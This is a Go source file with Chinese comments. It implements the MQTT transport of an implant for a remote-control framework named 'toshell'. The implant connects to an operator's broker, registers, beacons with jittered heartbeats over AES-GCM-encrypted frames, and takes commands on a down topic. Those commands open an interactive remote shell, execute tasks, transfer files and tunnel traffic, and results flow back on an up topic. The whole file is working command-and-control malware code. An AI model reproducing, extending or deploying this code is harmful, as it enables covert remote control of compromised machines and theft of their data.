//go:build transport_mqtt

package main

import (
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"

	mqtt "github.com/eclipse/paho.mqtt.golang"
)

// ─── MQTT 轮询通道（TSHL 帧 + AES-GCM，传输层 MQTT pub/sub）─────────
// 与 TCP/WS 通道共用帧协议（encodePacket/compress/encrypt），区别仅在传输层：
//   - 植入端订阅   toshell/<sessionID>/down  ← 服务端下发任务/控制帧
//   - 植入端发布   toshell/<sessionID>/up    → 服务端接收注册/心跳/结果/文件
// 消息体 = AES-GCM(compress(encodePacket))，与 WS 通道逐字节一致。
// MQTT keepalive 由 broker 维护，植入端仍发自研心跳帧驱动服务端 LastSeen。
//
// serverAddr 格式：mqtt://host:port[/prefix]（prefix 默认 toshell）
// 构建标签 transport_mqtt 由构建器按 protocol=mqtt 设置。

var (
	mqttMu   sync.Mutex // 保护 mqttClient 指针
	mqttClient mqtt.Client
	mqttPrefix string
	mqttSid    string // sessionID 十六进制（注册后确定）
	mqttDownCh chan *Packet
)

// isMQTTTransport 判断 serverAddr 是否为 MQTT 通道（mqtt:// 前缀）。
func isMQTTTransport(s string) bool {
	t := strings.TrimSpace(s)
	return strings.HasPrefix(t, "mqtt://") || strings.HasPrefix(t, "mqtts://")
}

// isHTTPTransport stub：MQTT 构建不含 HTTP 通道，恒 false。
func isHTTPTransport(s string) bool { return false }

// isWSTransport stub：MQTT 构建不含 WebSocket 通道，恒 false。
func isWSTransport(s string) bool { return false }

// httpMode/httpPollRun/httpSendFrame stub：MQTT 构建不含 HTTP 轮询通道。
var httpMode bool // 恒 false

func httpPollRun() {}

func httpSendFrame(p *Packet) bool { return false }

// wsPollRun stub：MQTT 构建不含 WebSocket 通道。
func wsPollRun() {}

// mqttSendFrame 发布一帧到上行主题 toshell/<sid>/up。
func mqttSendFrame(p *Packet) bool {
	mqttMu.Lock()
	client := mqttClient
	sid := mqttSid
	mqttMu.Unlock()
	if client == nil || sid == "" || !client.IsConnected() {
		return false
	}
	data := encodePacket(p)
	cmp, _ := compress(data)
	enc, err := encrypt(cmp)
	if err != nil {
		return false
	}
	topic := mqttPrefix + "/" + sid + "/up"
	tok := client.Publish(topic, 1, false, enc)
	tok.WaitTimeout(5 * time.Second)
	return tok.Error() == nil
}

// mqttPollRun MQTT 通道主循环：连接 broker → 订阅下行 → 注册 → 心跳+收帧。
// 与 wsPollRun 对齐：自建 taskCh（若为空），上行走 mqttSendFrameFn 钩子。
func mqttPollRun() {
	if taskCh == nil {
		gen := connGen.Add(1)
		taskCh = make(chan Task, 16)
		go taskWorker(gen)
	}
	defer func() {
		if taskCh != nil {
			close(taskCh)
			taskCh = nil
		}
	}()

	// 解析 broker 地址与主题前缀
	raw := serverAddr
	target := strings.TrimPrefix(raw, "mqtt://")
	target = strings.TrimPrefix(target, "mqtts://")
	prefix := "toshell"
	if i := strings.Index(target, "/"); i > 0 {
		prefix = target[i+1:]
		target = target[:i]
		if prefix == "" {
			prefix = "toshell"
		}
	}
	brokerURL := "tcp://" + target
	if strings.HasPrefix(raw, "mqtts://") {
		brokerURL = "ssl://" + target
	}
	mqttPrefix = prefix

	clientID := fmt.Sprintf("toshell-implant-%d", time.Now().UnixNano())
	opts := mqtt.NewClientOptions().
		AddBroker(brokerURL).
		SetClientID(clientID).
		SetCleanSession(true).
		SetConnectTimeout(10 * time.Second).
		SetAutoReconnect(true).
		SetMaxReconnectInterval(10 * time.Second).
		SetOrderMatters(false)

	client := mqtt.NewClient(opts)
	if tok := client.Connect(); tok.WaitTimeout(15*time.Second) && tok.Error() != nil {
		fmt.Printf("[MQTT] connect %s failed: %v\n", brokerURL, tok.Error())
		return
	}
	defer client.Disconnect(1000)

	mqttMu.Lock()
	mqttClient = client
	mqttMu.Unlock()
	mqttSendFrameFn = mqttSendFrame
	defer func() {
		mqttSendFrameFn = nil
		mqttMu.Lock()
		mqttClient = nil
		mqttMu.Unlock()
	}()

	// sessionID 在 main() 中生成；上行钩子需要它
	mqttSid = fmt.Sprintf("%x", sessionID)

	// 下行帧通道：订阅回调投递到这里，主循环消费
	mqttDownCh = make(chan *Packet, 64)

	downTopic := prefix + "/" + mqttSid + "/down"
	if tok := client.Subscribe(downTopic, 1, func(_ mqtt.Client, msg mqtt.Message) {
		pkt, err := parsePacket(msg.Payload())
		if err != nil || pkt == nil {
			return
		}
		select {
		case mqttDownCh <- pkt:
		default:
			// 队列满：直接同步处理（防丢帧）
			handleDownPacket(pkt)
		}
	}); tok.WaitTimeout(10*time.Second) && tok.Error() != nil {
		fmt.Printf("[MQTT] subscribe %s failed: %v\n", downTopic, tok.Error())
		return
	}

	// 注册
	if !mqttSendFrame(buildRegisterPacket()) {
		return
	}

	// 心跳独立 goroutine（与 WS 对齐）
	hbStop := make(chan struct{})
	defer close(hbStop)
	go func() {
		lastHb := time.Now()
		hbInterval := jitteredInterval(interval)
		ticker := time.NewTicker(time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-hbStop:
				return
			case <-ticker.C:
				if time.Since(lastHb) >= hbInterval {
					sendHeartbeat()
					lastHb = time.Now()
					hbInterval = jitteredInterval(interval)
				}
			}
		}
	}()

	// 主循环：消费下行帧
	for {
		select {
		case pkt := <-mqttDownCh:
			if pkt == nil {
				continue
			}
			handleDownPacket(pkt)
		case <-time.After(30 * time.Second):
			if !client.IsConnected() {
				return
			}
		}
	}
}

// handleDownPacket 处理服务端下行帧（任务/控制帧），与 WS/TCP 共用分发逻辑。
func handleDownPacket(pkt *Packet) {
	switch pkt.Type {
	case TypeTask:
		task, ok := parseTaskPayload(pkt.Payload)
		if ok && taskCh != nil {
			select {
			case taskCh <- task:
			default:
				executeAndSendResult(task, connGen.Load())
			}
		}
	case TypeShellOpen:
		handleShellOpen(pkt)
	case TypeShellData:
		handleShellData(pkt)
	case TypeShellClose:
		handleShellClose()
	case TypeFileUp:
		handleFileUp(pkt)
	case TypeTunnel:
		if len(pkt.Payload) >= 4 {
			totalLen := uint32(pkt.Payload[0])<<24 | uint32(pkt.Payload[1])<<16 | uint32(pkt.Payload[2])<<8 | uint32(pkt.Payload[3])
			if len(pkt.Payload) >= 4+int(totalLen) {
				processTunnelRaw(pkt.Payload[4 : 4+int(totalLen)])
			}
		}
	case TypeAck:
		touchRead()
	}
}

// parseTaskPayload 解析任务帧 payload → Task。
func parseTaskPayload(payload []byte) (Task, bool) {
	var t Task
	if err := json.Unmarshal(payload, &t); err != nil {
		return t, false
	}
	return t, true
}
